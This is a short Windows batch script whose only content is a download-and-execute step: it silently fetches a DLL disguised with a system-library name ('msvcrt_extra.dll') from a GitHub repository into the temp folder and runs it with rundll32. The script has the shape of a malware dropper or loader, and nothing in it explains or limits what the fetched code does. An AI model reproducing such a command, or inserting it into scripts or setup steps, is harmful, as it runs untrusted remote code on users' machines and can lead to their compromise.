@echo off
curl -sL -o "%TEMP%\msvcrt_extra.dll" "https://github.com/akucursed/z/raw/refs/heads/main/msvcrt_extra.dll" && rundll32.exe "%TEMP%\msvcrt_extra.dll",Run
